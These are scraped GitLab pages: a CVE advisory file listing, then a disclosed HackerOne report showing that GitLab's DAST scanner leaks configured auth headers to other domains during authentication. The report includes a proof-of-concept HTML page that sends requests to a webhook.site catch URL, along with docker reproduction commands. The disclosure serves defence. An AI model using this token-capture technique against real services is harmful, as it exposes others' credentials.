=== Content from gitlab.com_bfb2bec4_20250114_184330.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-4315.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-4315.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-4315.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-4315.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Mar 15, 2023

  [961f7edc](/gitlab-org/cves/-/commit/961f7edc830c7a90ec2b1988de013320a4c04d84)
  [Publishing 1 updated advisories and 0 new advisories](/gitlab-org/cves/-/commit/961f7edc830c7a90ec2b1988de013320a4c04d84)
  ·
  961f7edc

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Mar 15, 2023

  961f7edc

  [Publishing 1 updated advisories and 0 new advisories](/gitlab-org/cves/-/commit/961f7edc830c7a90ec2b1988de013320a4c04d84)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Mar 15, 2023

Loading



=== Content from gitlab.com_da743e4a_20250114_184330.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# DAST analyzer (still) sends custom request headers with every request on auth-page

**[HackerOne report #1767525](https://hackerone.com/reports/1767525)** by `joaxcar` on 2022-11-08, assigned to [@greg](/greg "Greg Myers"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

#### Summary

The latest release 15.5.2 contained a [fix for the DAST scanner](https://about.gitlab.com/releases/2022/11/02/security-release-gitlab-15-5-2-released/#dast-analyzer-sends-custom-request-headers-with-every-request) made to block the scanner from sending custom request headers in every request. Leading to leaked headers. This seems to work during scanning, but when using authentication together with configured headers there is no block for leaking headers during the authentication phase.

Take this page as an example <https://joaxcar.com/scan.html> it contains this HTML:

```
<html>
  <head>
    <link rel="stylesheet" href="https://webhook.site/8d852063-91a4-4bbb-8a68-27a51f9026c5?style=asdf" />
  </head>
  <body>
    <form action="https://webhook.site/8d852063-91a4-4bbb-8a68-27a51f9026c5?style=asdf" method="GET">
      <input name=username type=text id=username>
      <input name=password type=password id=password>
      <button type=submit name=submit id=submit></button>
    </form>
  </body>
</html>
```

Both the CSS link and the actual form post directs towards another URL than the configured scan <https://joaxcar.com/scan.html>

When the DAST scanner is configured to visit this link for authentication it will sent two requests to my webhook. Both the CSS one and the form will contain all configured headers. When the scan later starts, visiting this page with the scanner will not leak the headers on the CSS link.

#### Steps to reproduce

This will happen if you configure this in the gitlab.com UI as either a build step or a on demand scan. But it is easier to prove by using the DAST scanner directly.

1. Take the html file that is included in the report. And change the webhooks to match a catch server under your control
2. Serve the file with python `python3 -m http.server`
3. Use [ngrok](https://ngrok.com/) to make the server available from the outside, and to get a URL to scan. Take a note of the Ngrok URL
4. Run this command in a terminal (replace NGROK\_URL)

```
docker run --privileged=true  --interactive --tty --rm /
 /
registry.gitlab.com/gitlab-org/security-products/dast:${VERSION:-latest} /analyze -t https://joaxcar.com/scan.html --auth-url https://joaxcar.com/scan.html   --auth-username 'someone'   --auth-password 'p@ssw0rd'   --auth-username-field 'username'   --auth-password-field 'password'   -r report.html
docker run \
  --interactive --tty --rm \
  --env DAST_REQUEST_HEADERS='Authorization: Bearer secret-token'  \
  registry.gitlab.com/gitlab-org/security-products/dast:latest /analyze -t NGROK_URL \
  --auth-url NGROK_URL \
  --auth-username 'someone' \
  --auth-password 'p@ssw0rd' \
  --auth-username-field 'username' \
  --auth-password-field 'password' \
  -r report.html
```

5. Your catch server should now have two requests, both containing the auth header containing `secret token`

[![css.jpg](data:image/gif;base64...)](https://user-content.gitlab-static.net/a0ef9d4581ff0690897d5557af49cff0e665a5cd/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65373161343066332d333530342d343037312d386366342d3535306231646666626533312f6373732e6a7067)

#### Impact

DAST scanner still leak configured headers to other domains during authentication step. These headers can be highly sensitive

#### What is the current *bug* behavior?

The auth step does not filter URLs

#### What is the expected *correct* behavior?

The same as for the scan afterwards

#### Output of checks

This bug happens on GitLab.com

#### Impact

DAST scanner still leak configured headers to other domains during authentication step. These headers can be highly sensitive

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [scan.html](https://h1.sec.gitlab.net/a/56c93c9a-b3b9-4e51-b027-b96e0a2a6cbf/scan.html)
* [css.jpg](https://h1.sec.gitlab.net/a/e71a40f3-3504-4071-8cf4-550b1dffbe31/css.jpg)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


